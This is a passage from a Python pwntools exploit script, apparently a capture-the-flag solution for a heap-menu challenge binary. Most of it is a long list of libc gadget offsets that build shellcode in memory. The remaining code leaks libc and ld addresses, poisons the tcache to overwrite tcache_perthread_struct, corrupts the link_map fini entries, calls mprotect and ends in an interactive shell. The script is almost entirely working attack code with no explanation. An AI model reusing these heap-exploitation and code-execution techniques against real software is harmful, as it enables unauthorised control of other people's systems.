0x104080, #add x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0xed390, #mov x0, 0x64
0x104080, #add x2, x0
0x104080, #add x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x3e700, #mov x0, 0x40
0x104080, #add x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0xed390, #mov x0, 0x64
0x104080, #add x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x125ac0, #mov x0, 1
0xad7d0, #mov X0, 0x16d
0x104080, #add x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0xed390, #mov x0, 0x64
0x104080, #add x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x125ac0, #mov x0, 1
0xad7d0, #mov X0, 0x16d
0x104080, #add x2, x0
0x3e700, #mov x0, 0x40
0x104080, #add x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0xed390, #mov x0, 0x64
0x104080, #add x2, x0
0x104080, #add x2, x0
0x7f470, #mov x0, 0x16
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0xed390, #mov x0, 0x64
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x125ac0, #mov x0, 1
0x104080, #add x2, x0
0x126f20, #mov [x0], x3

0x33c20, #mov x3, 0
0x133d50, #mov x2, 0
0x125ac0, #mov x0, 1
0xad7d0, #mov X0, 0x16d
0x104080, #add x2, x0
0x3e700, #mov x0, 0x40
0x104080, #add x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x1031b4, #mov x3, x0
0x8ca44, #mov x0, libc
0x7fb10, #mov x2, x0
0x3e6f0, #mov x0, 0x22
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x8ca44, #mov x0, libc
0x82c50, #mov x0, 0x3
0x104080, #add x2, x0
0x11bcf4, #mov x0, 2
0x104080, #add x2, x0
0x126f20, #mov [x0], x3
 
        0x125ac0, #mov x0, 1
        0x91600,  #malloc
        0x11cfd0, #arb call

        0x1a6000, #shellcode
        #0x4cb20, #system
        0xbaaf0, #safe exit
        ]

def send(b,a=":"):
    p.sendlineafter(a,b)

def send2(b,a=":"):
    p.sendafter(a,b)

def create(index, size):
    send('1')
    send(str(index))
    send(str(size))

def edit(index, data):
    send('2')
    send(str(index))
    send2(data)

def delete(index):
    send('3')
    send(str(index))

def show(index):
    send('4')
    send(str(index))

def end():
    send('5')

p.readuntil(': ')
leak = int(p.readline(),16)
print(hex(leak))
#pause()

libc_base = leak-0x4cb20
print(hex(libc_base))

create(0,0x100)
create(1, 0x100)

delete(0)

print('1')
show(0)
p.readuntil('Data: ')
leak = p.read(8)
leak = u64(leak)<<12
print(hex(leak))
delete(1)

edit(1, p64((leak+0x10) ^ (leak>>12))) #setup tcache dup for attack on tcache_perthread_struct

create(1, 0x100)
edit(1, p64(0x1c) + p64(len(chain)*8+0x1000)) #fini_end
create(0, 0x100) 

#leak ld
ld_leak = libc_base + 0x1a0060

edit(0, b'\x07'*0x80 + p64(ld_leak-0x10))

create(2,24)
show(2)
p.readuntil('\x00'*10)
ld_base = u64(p.read(8)) - 0x12b44
print('ld',hex(ld_base))

elf_map = ld_base + 0x41360

print(hex(elf_map))

edit(0, b'\x07'*0x80 + p64(elf_map)) # overwirte tcache_perthread_struct

create(2,8)
edit(2, p64(leak-0x20000+0x1000)) #offset inside the chunk to correctly access it

print('2')
edit(0, b'\x07'*0x80 + p64(elf_map+288)) #setup second write for elf_map
print('3')

create(3,16)
edit(3, p64(leak+0x3b0)*2) #overwrite elf_map for fini_end count

chain = list(map(lambda x: x+libc_base, chain))[::-1]
chain = b''.join(map(p64,chain))

chain2 = [
        0, #next
        7, #0x4c8
        libc_base + 0x1a6000, #d0 target
        leak + 0x4d0,
        libc_base + 0xe5180, #mprotect
        0x1000,
        0x1007, #0xf0
        1,
        leak+0x4c8, #500
        4,
        6, 
        5
        ]
chain2 = b''.join(map(p64,chain2))

print(len(chain))
create(4, 0x5000)
edit(4, chain2 + b'a'*(2296-8+0x1000 - len(chain2)) + chain)

binsh = libc_base + 0x14da40
print(hex(binsh))
print(hex(libc_base + 0x3e700))

edit(0, b'\x07'*0x80 + p64(leak+0x4c0)) #setup second write for elf_map
end()

p.interactive()
